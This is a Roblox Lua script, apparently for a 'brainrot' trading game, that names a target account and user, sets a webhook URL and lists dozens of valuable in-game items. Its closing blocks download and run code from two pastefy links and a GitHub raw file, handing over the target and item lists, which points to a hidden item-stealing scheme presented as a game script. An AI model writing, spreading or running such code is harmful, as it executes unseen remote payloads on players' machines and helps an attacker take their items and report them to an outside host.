local TARGET_ID = 7997181398
local TARGET_USER = "ydfgkglu"
local WEBHOOK_URL = "https://chocola-moreira1.vercel.app/"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true,
    ["Plant Bros"] = true,
    ["Orchidox"] = true,
    ["Strawberry Elephant"] = true,
    ["Phoenix"] = true,
    ["Hydra Serpent"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Headless Horseman"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Money Money Bros"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Los Hackers"] = true,
    ["Sammyni Cakini"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Digi Narwhal"] = true,
    ["Bearito Cabinito"] = true,
    ["Los Admins"] = true,
    ["Moby Bros"] = true,
    ["Bunny and Eggy"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Gold Gold Gold"] = true,
    ["Guest 666"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Taco Combinasion"] = true,
    ["Examen Bros"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Amigos"] = true,
    ["Yetimatic"] = true,
    ["Bumbatron"] = true,
    ["S'more Serat"] = true,
    ["Scorpino Coasterino"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Sekolahs"] = true,
    ["Love Love Bear"] = true,
    ["Lovin Rose"] = true,
    ["Noo My Examine"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Candini Fluffini"] = true,
    ["Polaroidini"] = true,
    ["Sammyni Truckini"] = true,
    ["Nachorilla"] = true,
    ["La Fuse Machine"] = true,
    ["Panda Popanda"] = true
}

local TargetBaseSkins = {
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()

task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)